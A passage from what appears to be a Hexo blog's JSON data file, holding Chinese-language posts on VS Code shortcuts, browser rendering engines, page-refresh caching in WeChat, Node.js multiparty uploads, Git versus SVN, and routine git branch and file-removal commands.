Editing(多光标编辑)</strong><br></p>\n<ol>\n<li>框选择-按下<code>Ctrl+Shift+Alt+下箭头键</code>,<code>Ctrl+Shift+Alt+右转</code>,<code>Ctrl+Shift+Alt+UpArrow</code>,<code>Ctrl+Shift+Alt+LeftArrow</code>选择一个文本块,你也可以按住<code>Shift+Alt</code>,选择鼠标文本。</li>\n<li>添加一个光标-按<code>Ctrl+Alt+UpArrow</code>或<code>Ctrl+Alt+向下箭头</code>,在上面或下面添加一个新的游标,你也可以用Ctrl+Click来在任何地方添加光标。</li>\n<li>创建游标上出现的所有字符串的字符串-选择一个实例例如背景颜色和媒体未绑定。现在您可以通过简单地输入来替换所有实例。<br></li>\n</ol>\n</li>\n<li><p><strong>IntelliSense(智能提示)</strong><br></p>\n<ul>\n<li>Alt+Z/Alt+X</li>\n</ul>\n</li>\n<li><p><strong>Line Actions(行操作)</strong></p>\n<ol>\n<li>复制一条线,并将其插入到当前位置的上方或下方,分别使用Shift+Alt+向下箭头或Shift+Alt+UpArrow。</li>\n<li>用Alt+UpArrow和Alt+向下箭头移动整行或选择行。</li>\n<li>用Ctrl+Shift+K删除整个行。<br><br></li>\n</ol>\n<ul>\n<li>提示:另一个非常常见的任务是注释掉一个代码块——您可以通过按<code>Ctrl+/</code>来切换注释。</li>\n</ul>\n</li>\n<li><p><strong>Rename Refactoring(更名重构)</strong><br></p>\n<ul>\n<li>可以很容易地重命名一个符号,例如<code>函数名</code>或<code>变量名</code>。在<code>符号</code>“Book(例子)”中按<code>F2</code>重命名所有实例——这将发生在项目中的所有文件中。您还可以在右键单击上下文菜单中看到重构。</li>\n<li><code>JSDoc</code>提示:上面的示例还展示了通过使用<code>JSDoc</code>注释获得智能感知提示的另一种方法。您可以通过调用Book函数并查看功能和参数的智能感知体验中增强的上下文来尝试这一点。</li>\n</ul>\n</li>\n<li><p><strong>Refactoring via Extraction(!通过提取重构)</strong></p>\n<ul>\n<li>有时候,您希望将已经<code>编写好的代码</code>添加到一个<code>单独的函数</code>中,或者稍后再使用它。选择要提取的行并按<code>Ctrl+.</code>或者点击这个小灯泡,选择其中的一个提取到……选项。通过在第3行或任何其他您想要提出的通用代码中选择if-子句中的代码来尝试它。</li>\n</ul>\n</li>\n<li><p><strong>Formatting(格式化)</strong></p>\n<ul>\n<li>如果没有良好的格式化程序,让代码看起来很棒是很困难的。幸运的是,使用<code>Shift+Alt+F</code>或格式化的整个文档可以用<code>Ctrl+K Ctrl+F</code>来应用当前的选择。这两个选项都可以通过右键单击上下文菜单获得。</li>\n<li><code>Tip</code>: 可在扩展库中提供其他格式化程序。格式化支持也可以通过设置来配置,例如启用编辑器。</li>\n</ul>\n</li>\n<li><p><strong>Code folding(代码折叠)</strong></p>\n<ul>\n<li>在一个大的文件中,它通常可以用来折叠代码段以增加可读性。要做到这一点,你只需按<code>Ctrl+Shift+[</code>折叠代码-按<code>Ctrl+Shift+]</code>即可展开。折叠也可以用左边沟中的<code>+/-</code>图标来完成。按<code>Ctrl+Shift+Alt+[</code>或按<code>Ctrl+Shift+Alt+]</code>折叠所有部分。</li>\n<li>提示:折叠是基于缩进的,因此可以应用于所有语言。简单地缩进你的代码来创建一个可折叠的部分,你可以用Ctrl+K Ctrl+1和Ctrl+K Ctrl+5这样的快捷方式折叠一定数量的级别。</li>\n</ul>\n</li>\n<li><p><strong>Errors and Warnings(错误和警告)</strong></p>\n<ul>\n<li>在编辑代码时,会高亮显示错误和警告。在下面的示例中,您可以看到许多语法错误。按下<code>F8</code>,你可以按顺序浏览它们,并看到详细的错误信息。当您纠正它们时,弯角和滚动条指示器将会更新。</li>\n</ul>\n</li>\n<li><p><strong>Snippets(片段)</strong></p>\n<ul>\n<li>您可以通过使用片段大大加快编辑速度。简单地开始键入尝试,从<code>建议列表</code>和按<code>Tab</code>中选择<code>trycatch</code>来创建一个<code>try-&gt;catch块</code>。您的光标将被放置在文本错误,以方便编辑。如果有多个参数存在,则按Tab键跳到它。</li>\n</ul>\n</li>\n</ul>\n"},{"title":"五大浏览器 四大内核","date":"2018-05-12T02:51:40.000Z","_content":"## 下各常用浏览器所使用的内核。 \n\n1、IE浏览器内核：Trident内核，也是俗称的IE内核；\n\n2、Chrome浏览器内核：统称为Chromium内核或Chrome内核，以前是Webkit内核，现在是Blink内核； \n\n3、Firefox浏览器内核：Gecko内核，俗称Firefox内核； \n\n4、Safari浏览器内核：Webkit内核； \n\n5、Opera浏览器内核：最初是自己的Presto内核，后来是Webkit，现在是Blink内核； \n\n6、360浏览器、猎豹浏览器内核：IE+Chrome双内核；\n\n7、搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； \n\n8、百度浏览器、世界之窗内核：IE内核； \n\n9、2345浏览器内核：以前是IE内核，现在也是IE+Chrome双内核；","source":"_posts/FrontEnd/五大浏览器-四大内核.md","raw":"---\ntitle: 五大浏览器 四大内核\ndate: 2018-05-12 10:51:40\ntags: browser\ncategories: Browser\n---\n## 下各常用浏览器所使用的内核。 \n\n1、IE浏览器内核：Trident内核，也是俗称的IE内核；\n\n2、Chrome浏览器内核：统称为Chromium内核或Chrome内核，以前是Webkit内核，现在是Blink内核； \n\n3、Firefox浏览器内核：Gecko内核，俗称Firefox内核； \n\n4、Safari浏览器内核：Webkit内核； \n\n5、Opera浏览器内核：最初是自己的Presto内核，后来是Webkit，现在是Blink内核； \n\n6、360浏览器、猎豹浏览器内核：IE+Chrome双内核；\n\n7、搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； \n\n8、百度浏览器、世界之窗内核：IE内核； \n\n9、2345浏览器内核：以前是IE内核，现在也是IE+Chrome双内核；","slug":"FrontEnd/五大浏览器-四大内核","published":1,"updated":"2018-05-14T00:27:11.133Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29d001vb8xj1lal0vfu","content":"<h2 id=\"下各常用浏览器所使用的内核。\"><a href=\"#下各常用浏览器所使用的内核。\" class=\"headerlink\" title=\"下各常用浏览器所使用的内核。\"></a>下各常用浏览器所使用的内核。</h2><p>1、IE浏览器内核：Trident内核，也是俗称的IE内核；</p>\n<p>2、Chrome浏览器内核：统称为Chromium内核或Chrome内核，以前是Webkit内核，现在是Blink内核； </p>\n<p>3、Firefox浏览器内核：Gecko内核，俗称Firefox内核； </p>\n<p>4、Safari浏览器内核：Webkit内核； </p>\n<p>5、Opera浏览器内核：最初是自己的Presto内核，后来是Webkit，现在是Blink内核； </p>\n<p>6、360浏览器、猎豹浏览器内核：IE+Chrome双内核；</p>\n<p>7、搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； </p>\n<p>8、百度浏览器、世界之窗内核：IE内核； </p>\n<p>9、2345浏览器内核：以前是IE内核，现在也是IE+Chrome双内核；</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"下各常用浏览器所使用的内核。\"><a href=\"#下各常用浏览器所使用的内核。\" class=\"headerlink\" title=\"下各常用浏览器所使用的内核。\"></a>下各常用浏览器所使用的内核。</h2><p>1、IE浏览器内核：Trident内核，也是俗称的IE内核；</p>\n<p>2、Chrome浏览器内核：统称为Chromium内核或Chrome内核，以前是Webkit内核，现在是Blink内核； </p>\n<p>3、Firefox浏览器内核：Gecko内核，俗称Firefox内核； </p>\n<p>4、Safari浏览器内核：Webkit内核； </p>\n<p>5、Opera浏览器内核：最初是自己的Presto内核，后来是Webkit，现在是Blink内核； </p>\n<p>6、360浏览器、猎豹浏览器内核：IE+Chrome双内核；</p>\n<p>7、搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； </p>\n<p>8、百度浏览器、世界之窗内核：IE内核； </p>\n<p>9、2345浏览器内核：以前是IE内核，现在也是IE+Chrome双内核；</p>\n"},{"title":"前端刷新机制","date":"2018-05-14T08:47:41.000Z","_content":"\n## 微信-Android 浏览器刷新有缓存？\n\n前端刷新网页的方法有很多种：\n\n1：history.go(0) \n浏览器的history对象，go 跳转到指定位置的页面。\n\n2：location.reload(true); \n重新渲染当前页面，参数为真时是从服务器端重新渲染，并响应页面，参数为假时则优先获取缓存。\n\n3：location.replace(location); \n替换当前页面的连接\n\n4：location.assign(location); \n导航到一个新的连接\n\n5：location.href = location.href\n\n以上几种方法都是比较常见的页面重新加载的方法。 \n但是在安卓微信浏览器中却无计可施。 \n安卓微信浏览器的缓存机制一直都是一个很诡异的问题，好想官方能有一个书面的解释，也不至于让frontender们这么辛苦。\n\n有效的方法： \nurl?time=123 \n在参数上加一个随机参数，可以使微信不再加载缓存。\n\n我猜想安卓微信可能将每个渲染的页面都缓存起来了，一定时间内只要url没有变化，都会优先获取缓存的内容。\n\n--------------------------------------\n[阅读原文](https://blog.csdn.net/wmzy1067111110/article/details/73650818)","source":"_posts/FrontEnd/前端刷新机制.md","raw":"---\ntitle: 前端刷新机制\ndate: 2018-05-14 16:47:41\ntags: 刷新机制\ncategories: js-window\n---\n\n## 微信-Android 浏览器刷新有缓存？\n\n前端刷新网页的方法有很多种：\n\n1：history.go(0) \n浏览器的history对象，go 跳转到指定位置的页面。\n\n2：location.reload(true); \n重新渲染当前页面，参数为真时是从服务器端重新渲染，并响应页面，参数为假时则优先获取缓存。\n\n3：location.replace(location); \n替换当前页面的连接\n\n4：location.assign(location); \n导航到一个新的连接\n\n5：location.href = location.href\n\n以上几种方法都是比较常见的页面重新加载的方法。 \n但是在安卓微信浏览器中却无计可施。 \n安卓微信浏览器的缓存机制一直都是一个很诡异的问题，好想官方能有一个书面的解释，也不至于让frontender们这么辛苦。\n\n有效的方法： \nurl?time=123 \n在参数上加一个随机参数，可以使微信不再加载缓存。\n\n我猜想安卓微信可能将每个渲染的页面都缓存起来了，一定时间内只要url没有变化，都会优先获取缓存的内容。\n\n--------------------------------------\n[阅读原文](https://blog.csdn.net/wmzy1067111110/article/details/73650818)","slug":"FrontEnd/前端刷新机制","published":1,"updated":"2018-06-13T06:36:55.131Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29e001wb8xjmkvh390h","content":"<h2 id=\"微信-Android-浏览器刷新有缓存？\"><a href=\"#微信-Android-浏览器刷新有缓存？\" class=\"headerlink\" title=\"微信-Android 浏览器刷新有缓存？\"></a>微信-Android 浏览器刷新有缓存？</h2><p>前端刷新网页的方法有很多种：</p>\n<p>1：history.go(0)<br>浏览器的history对象，go 跳转到指定位置的页面。</p>\n<p>2：location.reload(true);<br>重新渲染当前页面，参数为真时是从服务器端重新渲染，并响应页面，参数为假时则优先获取缓存。</p>\n<p>3：location.replace(location);<br>替换当前页面的连接</p>\n<p>4：location.assign(location);<br>导航到一个新的连接</p>\n<p>5：location.href = location.href</p>\n<p>以上几种方法都是比较常见的页面重新加载的方法。<br>但是在安卓微信浏览器中却无计可施。<br>安卓微信浏览器的缓存机制一直都是一个很诡异的问题，好想官方能有一个书面的解释，也不至于让frontender们这么辛苦。</p>\n<p>有效的方法：<br>url?time=123<br>在参数上加一个随机参数，可以使微信不再加载缓存。</p>\n<p>我猜想安卓微信可能将每个渲染的页面都缓存起来了，一定时间内只要url没有变化，都会优先获取缓存的内容。</p>\n<hr>\n<p><a href=\"https://blog.csdn.net/wmzy1067111110/article/details/73650818\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"微信-Android-浏览器刷新有缓存？\"><a href=\"#微信-Android-浏览器刷新有缓存？\" class=\"headerlink\" title=\"微信-Android 浏览器刷新有缓存？\"></a>微信-Android 浏览器刷新有缓存？</h2><p>前端刷新网页的方法有很多种：</p>\n<p>1：history.go(0)<br>浏览器的history对象，go 跳转到指定位置的页面。</p>\n<p>2：location.reload(true);<br>重新渲染当前页面，参数为真时是从服务器端重新渲染，并响应页面，参数为假时则优先获取缓存。</p>\n<p>3：location.replace(location);<br>替换当前页面的连接</p>\n<p>4：location.assign(location);<br>导航到一个新的连接</p>\n<p>5：location.href = location.href</p>\n<p>以上几种方法都是比较常见的页面重新加载的方法。<br>但是在安卓微信浏览器中却无计可施。<br>安卓微信浏览器的缓存机制一直都是一个很诡异的问题，好想官方能有一个书面的解释，也不至于让frontender们这么辛苦。</p>\n<p>有效的方法：<br>url?time=123<br>在参数上加一个随机参数，可以使微信不再加载缓存。</p>\n<p>我猜想安卓微信可能将每个渲染的页面都缓存起来了，一定时间内只要url没有变化，都会优先获取缓存的内容。</p>\n<hr>\n<p><a href=\"https://blog.csdn.net/wmzy1067111110/article/details/73650818\" target=\"_blank\" rel=\"noopener\">阅读原文</a></p>\n"},{"title":"前端图片上传","date":"2018-07-04T10:24:20.000Z","_content":"## [转][node.js 实现图片上传服务](https://blog.csdn.net/ziyetian666/article/details/79737495)\n\n## 使用multiparty插件实现上传\n### 安装multiparty\n> npm i --save multiparty\n\n### 代码实现\n````\nconst multiparty = require('multiparty');\n\nlet form = new multiparty.Form({uploadDir: upload.path});\n````\n\n### 构造参数说明\n\n`encoding` 设置接收数据编码，默认是utf-8\n\n`maxFieldsSize` 限制字段可以分配的内存量,默认2M\n\n`maxFields` 限制在发出错误事件之前将要解析的字段数,默认1000\n\n`maxFilesSize` 限制总文件大小，默认无穷大\n\n`autoFields` 启用字段事件并禁用字段的部分事件。如果添加字段侦听器，则自动将其设置为true。\n\n`autoFiles` 启用文件事件并禁用文件的部分事件。如果添加了一个文件侦听器，则自动将其设置为true。\n\n`uploadDir` 文件上传的目录\n\n**如果回调提供，`autofields`和`autofiles`被设置为`true`，所有字段和文件的收集和传递给回调，不再需要听任何形式的事件。**\n\n\n### 事件说明\n\n+ part 请求文件数据时触发，回调函数是一个实现可读流的实例对象\n  - headers：头部文件\n  - name：字段名称\n  - filename：文件名称\n  - byteFffset：主体数据的字节偏移量\n  - byteCount：数据总的字节长度\n","source":"_posts/FrontEnd/前端图片上传.md","raw":"---\ntitle: 前端图片上传\ndate: 2018-07-04 18:24:20\ntags: 图片上传\ncategories: Node multiparty\n---\n## [转][node.js 实现图片上传服务](https://blog.csdn.net/ziyetian666/article/details/79737495)\n\n## 使用multiparty插件实现上传\n### 安装multiparty\n> npm i --save multiparty\n\n### 代码实现\n````\nconst multiparty = require('multiparty');\n\nlet form = new multiparty.Form({uploadDir: upload.path});\n````\n\n### 构造参数说明\n\n`encoding` 设置接收数据编码，默认是utf-8\n\n`maxFieldsSize` 限制字段可以分配的内存量,默认2M\n\n`maxFields` 限制在发出错误事件之前将要解析的字段数,默认1000\n\n`maxFilesSize` 限制总文件大小，默认无穷大\n\n`autoFields` 启用字段事件并禁用字段的部分事件。如果添加字段侦听器，则自动将其设置为true。\n\n`autoFiles` 启用文件事件并禁用文件的部分事件。如果添加了一个文件侦听器，则自动将其设置为true。\n\n`uploadDir` 文件上传的目录\n\n**如果回调提供，`autofields`和`autofiles`被设置为`true`，所有字段和文件的收集和传递给回调，不再需要听任何形式的事件。**\n\n\n### 事件说明\n\n+ part 请求文件数据时触发，回调函数是一个实现可读流的实例对象\n  - headers：头部文件\n  - name：字段名称\n  - filename：文件名称\n  - byteFffset：主体数据的字节偏移量\n  - byteCount：数据总的字节长度\n","slug":"FrontEnd/前端图片上传","published":1,"updated":"2018-07-05T03:30:07.142Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29g0020b8xjc9hvmast","content":"<h2 id=\"转-node-js-实现图片上传服务\"><a href=\"#转-node-js-实现图片上传服务\" class=\"headerlink\" title=\"[转]node.js 实现图片上传服务\"></a>[转]<a href=\"https://blog.csdn.net/ziyetian666/article/details/79737495\" target=\"_blank\" rel=\"noopener\">node.js 实现图片上传服务</a></h2><h2 id=\"使用multiparty插件实现上传\"><a href=\"#使用multiparty插件实现上传\" class=\"headerlink\" title=\"使用multiparty插件实现上传\"></a>使用multiparty插件实现上传</h2><h3 id=\"安装multiparty\"><a href=\"#安装multiparty\" class=\"headerlink\" title=\"安装multiparty\"></a>安装multiparty</h3><blockquote>\n<p>npm i –save multiparty</p>\n</blockquote>\n<h3 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const multiparty = require(&apos;multiparty&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">let form = new multiparty.Form(&#123;uploadDir: upload.path&#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"构造参数说明\"><a href=\"#构造参数说明\" class=\"headerlink\" title=\"构造参数说明\"></a>构造参数说明</h3><p><code>encoding</code> 设置接收数据编码，默认是utf-8</p>\n<p><code>maxFieldsSize</code> 限制字段可以分配的内存量,默认2M</p>\n<p><code>maxFields</code> 限制在发出错误事件之前将要解析的字段数,默认1000</p>\n<p><code>maxFilesSize</code> 限制总文件大小，默认无穷大</p>\n<p><code>autoFields</code> 启用字段事件并禁用字段的部分事件。如果添加字段侦听器，则自动将其设置为true。</p>\n<p><code>autoFiles</code> 启用文件事件并禁用文件的部分事件。如果添加了一个文件侦听器，则自动将其设置为true。</p>\n<p><code>uploadDir</code> 文件上传的目录</p>\n<p><strong>如果回调提供，<code>autofields</code>和<code>autofiles</code>被设置为<code>true</code>，所有字段和文件的收集和传递给回调，不再需要听任何形式的事件。</strong></p>\n<h3 id=\"事件说明\"><a href=\"#事件说明\" class=\"headerlink\" title=\"事件说明\"></a>事件说明</h3><ul>\n<li>part 请求文件数据时触发，回调函数是一个实现可读流的实例对象<ul>\n<li>headers：头部文件</li>\n<li>name：字段名称</li>\n<li>filename：文件名称</li>\n<li>byteFffset：主体数据的字节偏移量</li>\n<li>byteCount：数据总的字节长度</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"转-node-js-实现图片上传服务\"><a href=\"#转-node-js-实现图片上传服务\" class=\"headerlink\" title=\"[转]node.js 实现图片上传服务\"></a>[转]<a href=\"https://blog.csdn.net/ziyetian666/article/details/79737495\" target=\"_blank\" rel=\"noopener\">node.js 实现图片上传服务</a></h2><h2 id=\"使用multiparty插件实现上传\"><a href=\"#使用multiparty插件实现上传\" class=\"headerlink\" title=\"使用multiparty插件实现上传\"></a>使用multiparty插件实现上传</h2><h3 id=\"安装multiparty\"><a href=\"#安装multiparty\" class=\"headerlink\" title=\"安装multiparty\"></a>安装multiparty</h3><blockquote>\n<p>npm i –save multiparty</p>\n</blockquote>\n<h3 id=\"代码实现\"><a href=\"#代码实现\" class=\"headerlink\" title=\"代码实现\"></a>代码实现</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const multiparty = require(&apos;multiparty&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">let form = new multiparty.Form(&#123;uploadDir: upload.path&#125;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"构造参数说明\"><a href=\"#构造参数说明\" class=\"headerlink\" title=\"构造参数说明\"></a>构造参数说明</h3><p><code>encoding</code> 设置接收数据编码，默认是utf-8</p>\n<p><code>maxFieldsSize</code> 限制字段可以分配的内存量,默认2M</p>\n<p><code>maxFields</code> 限制在发出错误事件之前将要解析的字段数,默认1000</p>\n<p><code>maxFilesSize</code> 限制总文件大小，默认无穷大</p>\n<p><code>autoFields</code> 启用字段事件并禁用字段的部分事件。如果添加字段侦听器，则自动将其设置为true。</p>\n<p><code>autoFiles</code> 启用文件事件并禁用文件的部分事件。如果添加了一个文件侦听器，则自动将其设置为true。</p>\n<p><code>uploadDir</code> 文件上传的目录</p>\n<p><strong>如果回调提供，<code>autofields</code>和<code>autofiles</code>被设置为<code>true</code>，所有字段和文件的收集和传递给回调，不再需要听任何形式的事件。</strong></p>\n<h3 id=\"事件说明\"><a href=\"#事件说明\" class=\"headerlink\" title=\"事件说明\"></a>事件说明</h3><ul>\n<li>part 请求文件数据时触发，回调函数是一个实现可读流的实例对象<ul>\n<li>headers：头部文件</li>\n<li>name：字段名称</li>\n<li>filename：文件名称</li>\n<li>byteFffset：主体数据的字节偏移量</li>\n<li>byteCount：数据总的字节长度</li>\n</ul>\n</li>\n</ul>\n"},{"title":"Git与SVN区别","date":"2017-12-09T06:03:59.000Z","_content":"#### Git不仅是版本控制，也是内容/工作管理系统\n\n1. Git`分布式`，SVN不是。与非分布式版本控制系统最`核心区别`\n\n2. Git按`元数据`方式储存，SVN按文件\n\n3. 分支不同\n\n4. Git没有全局版本号；SVN有。目前为止相比缺少的一个最大特征\n\n5. Git内容完整性优于SVN，Git内容存储使用`SHA-l`哈希算法","source":"_posts/GIT/Git与SVN区别.md","raw":"---\ntitle: Git与SVN区别\ndate: 2017-12-09 14:03:59\ntags: git与svn\ncategories: GIT\n---\n#### Git不仅是版本控制，也是内容/工作管理系统\n\n1. Git`分布式`，SVN不是。与非分布式版本控制系统最`核心区别`\n\n2. Git按`元数据`方式储存，SVN按文件\n\n3. 分支不同\n\n4. Git没有全局版本号；SVN有。目前为止相比缺少的一个最大特征\n\n5. Git内容完整性优于SVN，Git内容存储使用`SHA-l`哈希算法","slug":"GIT/Git与SVN区别","published":1,"updated":"2018-05-09T06:27:53.116Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29h0021b8xjsqkrajg0","content":"<h4 id=\"Git不仅是版本控制，也是内容-工作管理系统\"><a href=\"#Git不仅是版本控制，也是内容-工作管理系统\" class=\"headerlink\" title=\"Git不仅是版本控制，也是内容/工作管理系统\"></a>Git不仅是版本控制，也是内容/工作管理系统</h4><ol>\n<li><p>Git<code>分布式</code>，SVN不是。与非分布式版本控制系统最<code>核心区别</code></p>\n</li>\n<li><p>Git按<code>元数据</code>方式储存，SVN按文件</p>\n</li>\n<li><p>分支不同</p>\n</li>\n<li><p>Git没有全局版本号；SVN有。目前为止相比缺少的一个最大特征</p>\n</li>\n<li><p>Git内容完整性优于SVN，Git内容存储使用<code>SHA-l</code>哈希算法</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"Git不仅是版本控制，也是内容-工作管理系统\"><a href=\"#Git不仅是版本控制，也是内容-工作管理系统\" class=\"headerlink\" title=\"Git不仅是版本控制，也是内容/工作管理系统\"></a>Git不仅是版本控制，也是内容/工作管理系统</h4><ol>\n<li><p>Git<code>分布式</code>，SVN不是。与非分布式版本控制系统最<code>核心区别</code></p>\n</li>\n<li><p>Git按<code>元数据</code>方式储存，SVN按文件</p>\n</li>\n<li><p>分支不同</p>\n</li>\n<li><p>Git没有全局版本号；SVN有。目前为止相比缺少的一个最大特征</p>\n</li>\n<li><p>Git内容完整性优于SVN，Git内容存储使用<code>SHA-l</code>哈希算法</p>\n</li>\n</ol>\n"},{"title":"git 删除远程文件/目录","date":"2018-04-28T08:27:48.000Z","archives":"版本控制","_content":"# git删除远程仓库的文件或目录\n删除a目录下的2.txt文件   \n````\ngit rm -r --cached a/2.txt\n````\n\n删除a目录\n    \n    git rm -r --cached a\n    \n    git commit -m \"删除a目录下的2.txt文件\" \n    git push\n\n\n**Note:**\n\n用`-r`参数删除目录, `git rm --cached a.txt` 删除的是本地仓库中的文件，且`本地工作区`的文件会`保留`且`不再与远程仓库发生跟踪关系`，如果本地仓库中的文件也要删除则用`git rm a.txt`","source":"_posts/GIT/git-删除远程文件-目录.md","raw":"---\ntitle: git 删除远程文件/目录\ndate: 2018-04-28 16:27:48\ntags: git 删除\narchives: 版本控制\ncategories: git\n---\n# git删除远程仓库的文件或目录\n删除a目录下的2.txt文件   \n````\ngit rm -r --cached a/2.txt\n````\n\n删除a目录\n    \n    git rm -r --cached a\n    \n    git commit -m \"删除a目录下的2.txt文件\" \n    git push\n\n\n**Note:**\n\n用`-r`参数删除目录, `git rm --cached a.txt` 删除的是本地仓库中的文件，且`本地工作区`的文件会`保留`且`不再与远程仓库发生跟踪关系`，如果本地仓库中的文件也要删除则用`git rm a.txt`","slug":"GIT/git-删除远程文件-目录","published":1,"updated":"2018-05-05T01:18:18.310Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29k0025b8xjdfb4f233","content":"<h1 id=\"git删除远程仓库的文件或目录\"><a href=\"#git删除远程仓库的文件或目录\" class=\"headerlink\" title=\"git删除远程仓库的文件或目录\"></a>git删除远程仓库的文件或目录</h1><p>删除a目录下的2.txt文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rm -r --cached a/2.txt</span><br></pre></td></tr></table></figure></p>\n<p>删除a目录</p>\n<pre><code>git rm -r --cached a\n\ngit commit -m &quot;删除a目录下的2.txt文件&quot; \ngit push\n</code></pre><p><strong>Note:</strong></p>\n<p>用<code>-r</code>参数删除目录, <code>git rm --cached a.txt</code> 删除的是本地仓库中的文件，且<code>本地工作区</code>的文件会<code>保留</code>且<code>不再与远程仓库发生跟踪关系</code>，如果本地仓库中的文件也要删除则用<code>git rm a.txt</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"git删除远程仓库的文件或目录\"><a href=\"#git删除远程仓库的文件或目录\" class=\"headerlink\" title=\"git删除远程仓库的文件或目录\"></a>git删除远程仓库的文件或目录</h1><p>删除a目录下的2.txt文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git rm -r --cached a/2.txt</span><br></pre></td></tr></table></figure></p>\n<p>删除a目录</p>\n<pre><code>git rm -r --cached a\n\ngit commit -m &quot;删除a目录下的2.txt文件&quot; \ngit push\n</code></pre><p><strong>Note:</strong></p>\n<p>用<code>-r</code>参数删除目录, <code>git rm --cached a.txt</code> 删除的是本地仓库中的文件，且<code>本地工作区</code>的文件会<code>保留</code>且<code>不再与远程仓库发生跟踪关系</code>，如果本地仓库中的文件也要删除则用<code>git rm a.txt</code></p>\n"},{"title":"git 操作规范","date":"2018-04-28T07:25:23.000Z","archives":"版本控制","_content":"## 一、 创建与合并分支\n1. 从master分支创建dev分支并切换到dev分支\n````\n  git checkout master    \n  git checkout -b dev\n````\n+ `git checkout -b dev` 等价于：\n````\n  git branch dev    \n  git checkout dev\n````\n+ 查看`本地当前分支`，分支前面带` \"*\" `表示当前分支，剩下的分支表示本地有的分支：\n````\n  git branch\n````\n+ 查看`远程全部分支`，白色的表示本地有的，红色的表示本地没有，仅在远程存在：\n````\n  git branch -a\n````\n\n2. 修改代码、提交代码(当前的操作是在dev分支上进行)\n````\n  git add a.html\n  git commit -m \"提交文件a.html\"\n````\n\n3. 分支合并(将dev合并到master)\n````\n  git checkout master     \n  git merge dev\n````\n\n4. 合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)\n````\n  git branch -d dev\n````\n\n5. 删除后，查看分支(此时看不到dev分支了)\n````\n  git branch\n````\n\n6. 总结 ：工作中经常从`master`创建新分支，具体操作如下：\n````\n  git checkout master   \n  git checkout -b  issues1234   \n  git push origin issues1234   \n  git add ..  \n  git commit -m \"***\"\n  git push origin issues1234\n````\n\n+ 注意：将本地分支branch1推到远端的branch2操作步骤：\n````\n  git push origin branch1:branch2\n````\n\n7. 删除分支\n\n  git branch -D issues1234 // 本地强制删除分支 issues1234    \n\n  git push origin  :issues1234  //推到远程","source":"_posts/GIT/git-操作规范.md","raw":"---\ntitle: git 操作规范\ndate: 2018-04-28 15:25:23\ntags: git 操作规范\narchives: 版本控制\ncategories: git\n---\n## 一、 创建与合并分支\n1. 从master分支创建dev分支并切换到dev分支\n````\n  git checkout master    \n  git checkout -b dev\n````\n+ `git checkout -b dev` 等价于：\n````\n  git branch dev    \n  git checkout dev\n````\n+ 查看`本地当前分支`，分支前面带` \"*\" `表示当前分支，剩下的分支表示本地有的分支：\n````\n  git branch\n````\n+ 查看`远程全部分支`，白色的表示本地有的，红色的表示本地没有，仅在远程存在：\n````\n  git branch -a\n````\n\n2. 修改代码、提交代码(当前的操作是在dev分支上进行)\n````\n  git add a.html\n  git commit -m \"提交文件a.html\"\n````\n\n3. 分支合并(将dev合并到master)\n````\n  git checkout master     \n  git merge dev\n````\n\n4. 合并完成后，删除dev分支.(删除dev分支时，注意我们当前所在的分支不能是dev分支)\n````\n  git branch -d dev\n````\n\n5. 删除后，查看分支(此时看不到dev分支了)\n````\n  git branch\n````\n\n6. 总结 ：工作中经常从`master`创建新分支，具体操作如下：\n````\n  git checkout master   \n  git checkout -b  issues1234   \n  git push origin issues1234   \n  git add ..  \n  git commit -m \"***\"\n  git push origin issues1234\n````\n\n+ 注意：将本地分支branch1推到远端的branch2操作步骤：\n````\n  git push origin branch1:branch2\n````\n\n7. 删除分支\n\n  git branch -D issues1234 // 本地强制删除分支 issues1234    \n\n  git push origin  :issues1234  //推到远程","slug":"GIT/git-操作规范","published":1,"updated":"2018-05-05T01:18:27.984Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjj87i29m0027b8xjphwrty08","content":"<h2 id=\"一、-创建与合并分支\"><a href=\"#一、-创建与合并分支\" class=\"headerlink\" title=\"一、 创建与合并分支\"></a>一、 创建与合并分支</h2><ol>\n<li>从master分支创建dev分支并切换到dev分支<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout master    </span><br><span class=\"line\">git checkout -b dev</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<ul>\n<li><p><code>git checkout -b dev</code> 等价于：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 